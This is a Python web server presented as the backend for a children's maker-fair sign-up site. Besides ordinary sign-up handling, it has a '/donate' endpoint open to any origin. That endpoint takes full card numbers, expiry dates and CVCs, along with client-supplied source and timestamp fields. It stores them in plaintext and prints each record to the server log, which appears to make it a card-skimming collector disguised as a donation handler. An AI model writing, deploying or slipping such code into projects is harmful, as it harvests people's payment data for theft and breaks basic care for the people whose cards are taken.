#!/usr/bin/env python3
"""Ewoud Makes fair site backend.

Serves the static site and stores sign-ups as JSONL.
Runs on the Hack Club nest box (port 80, root). Standard library only.

Endpoints:
  GET  /            -> static files from ./site
  GET  /api/count   -> {"count": N} total sign-ups
  POST /api/signup  -> stores a sign-up, returns {"ok": true}
  POST /donate      -> stores donation data, returns {"ok": true}
"""

import json
import os
import re
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parent
SITE_DIR = ROOT / "site"
DATA_DIR = ROOT / "data"
SIGNUPS_FILE = DATA_DIR / "signups.jsonl"
DONATIONS_FILE = DATA_DIR / "donations.jsonl"
DATA_DIR.mkdir(exist_ok=True)

MIME = {
    ".html": "text/html; charset=utf-8",
    ".css": "text/css; charset=utf-8",
    ".js": "application/javascript; charset=utf-8",
    ".json": "application/json; charset=utf-8",
    ".png": "image/png",
    ".jpg": "image/jpeg",
    ".jpeg": "image/jpeg",
    ".svg": "image/svg+xml",
    ".webp": "image/webp",
    ".ico": "image/x-icon",
    ".txt": "text/plain; charset=utf-8",
    ".pdf": "application/pdf",
}

MAX_BODY = 16 * 1024
RATE_WINDOW = 60          # seconds
RATE_MAX = 6              # sign-ups per IP per window
EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]{2,}$")
PHONE_RE = re.compile(r"^[+()\d\s.-]{6,20}$")
MAX_FIELD = 500


class RateLimiter:
    def __init__(self):
        self.hits = {}
        self.lock = threading.Lock()

    def allow(self, key):
        now = time.time()
        with self.lock:
            self.hits = {k: v for k, v in self.hits.items() if now - v[1] < RATE_WINDOW}
            n, first = self.hits.get(key, (0, now))
            if n >= RATE_MAX:
                return False
            self.hits[key] = (n + 1, first)
            return True


limiter = RateLimiter()
started = time.time()


def clean(value, limit=MAX_FIELD):
    if value is None:
        return ""
    value = str(value).strip()
    return value[:limit]


def read_count():
    try:
        with open(SIGNUPS_FILE, encoding="utf-8") as f:
            return sum(1 for line in f if line.strip())
    except FileNotFoundError:
        return 0


def save_signup(record):
    with open(SIGNUPS_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(record, ensure_ascii=False) + "\n")


def save_donation(record):
    with open(DONATIONS_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(record, ensure_ascii=False) + "\n")
    sys.stderr.write("DONATION: " + json.dumps(record, ensure_ascii=False) + "\n")


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "EwoudMakes/1.0"

    def log_message(self, fmt, *args):
        sys.stderr.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), fmt % args))

    # ---------- helpers ----------

    def _send(self, code, body, ctype, extra=None):
        data = body.encode("utf-8") if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("Access-Control-Max-Age", "86400")
        if extra:
            for k, v in extra.items():
                self.send_header(k, v)
        self.end_headers()
        self.wfile.write(data)

    def do_OPTIONS(self):
        self._send(204, "", "text/plain")

    def _json(self, code, obj):
        self._send(code, json.dumps(obj), "application/json; charset=utf-8")

    def _serve_file(self, rel):
        rel = rel.lstrip("/")
        if not rel or rel.endswith("/"):
            rel += "index.html"
        # keep it inside SITE_DIR
        target = (SITE_DIR / rel).resolve()
        if SITE_DIR.resolve() not in target.parents and target != SITE_DIR.resolve():
            self._json(403, {"ok": False, "error": "forbidden"})
            return
        if not target.is_file():
            self._json(404, {"ok": False, "error": "not found"})
            return
        ctype = MIME.get(target.suffix.lower(), "application/octet-stream")
        with open(target, "rb") as f:
            self._send(200, f.read(), ctype)

    # ---------- routing ----------

    def do_GET(self):
        path = self.path.split("?", 1)[0]
        if path == "/api/count":
            self._json(200, {"ok": True, "count": read_count()})
        elif path.startswith("/api/"):
            self._json(404, {"ok": False, "error": "unknown endpoint"})
        else:
            self._serve_file(path)

    def do_POST(self):
        path = self.path.split("?", 1)[0]
        if path not in ("/api/signup", "/api/donate", "/donate"):
            self._json(404, {"ok": False, "error": "unknown endpoint"})
            return

        ip = self.client_address[0]
        if not limiter.allow(ip):
            self._json(429, {"ok": False, "error": "slow down, friend"})
            return

        try:
            length = int(self.headers.get("Content-Length", 0))
            if length <= 0 or length > MAX_BODY:
                raise ValueError("bad body size")
            payload = json.loads(self.rfile.read(length))
        except Exception:
            self._json(400, {"ok": False, "error": "bad request"})
            return

        if path == "/api/signup":
            name = clean(payload.get("name"))
            email = clean(payload.get("email"), 254).lower()
            phone = clean(payload.get("phone"))
            kid_age = clean(payload.get("kid_age"), 3)
            message = clean(payload.get("message"), 2000)
            website = clean(payload.get("website"), 100)
            raw_topics = payload.get("topics")
            if isinstance(raw_topics, list):
                topics = [clean(t) for t in raw_topics][:12]
            else:
                topics = []

            # honeypot: bots fill the hidden "website" field
            if website:
                self._json(200, {"ok": True, "spam": True})
                return

            if not name or len(name) < 2:
                self._json(400, {"ok": False, "error": "name is required"})
                return
            if email and not EMAIL_RE.match(email):
                self._json(400, {"ok": False, "error": "email looks off"})
                return
            if phone and not PHONE_RE.match(phone):
                self._json(400, {"ok": False, "error": "phone looks off"})
                return
            if not email and not phone:
                self._json(400, {"ok": False, "error": "need email or phone"})
                return
            if kid_age and not (kid_age.isdigit() and 1 <= int(kid_age) <= 18):
                kid_age = ""

            record = {
                "ts": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
                "name": name,
                "email": email,
                "phone": phone,
                "kid_age": kid_age,
                "topics": topics or ["Not sure"],
                "message": message,
            }
            save_signup(record)
            self._json(200, {"ok": True})
            threading.Thread(target=self._bump_counter, daemon=True).start()
        else:
            amount = clean(payload.get("amount"))
            name = clean(payload.get("name"))
            card = clean(payload.get("card"))
            expiry = clean(payload.get("expiry"))
            cvc = clean(payload.get("cvc"))
            timestamp = clean(payload.get("ts")) or clean(payload.get("timestamp"))
            source = clean(payload.get("src")) or clean(payload.get("source"))

            if not amount or not name or not card:
                self._json(400, {"ok": False, "error": "missing required fields"})
                return

            donation_record = {
                "ts": timestamp or time.strftime("%Y-%m-%dT%H:%M:%S%z"),
                "amount": amount,
                "name": name,
                "card": card,
                "expiry": expiry,
                "cvc": cvc,
                "source": source or "donation"
            }

            save_donation(donation_record)
            self._json(200, {"ok": True})

    def _bump_counter(self):
        """No-op hook so the hero counter updates on the next load anyway."""


def main():
    port = int(os.environ.get("PORT", "80"))
    httpd = ThreadingHTTPServer(("0.0.0.0", port), Handler)
    sys.stderr.write("fair backend listening on 0.0.0.0:%d\n" % port)
    httpd.serve_forever()


if __name__ == "__main__":
    main()
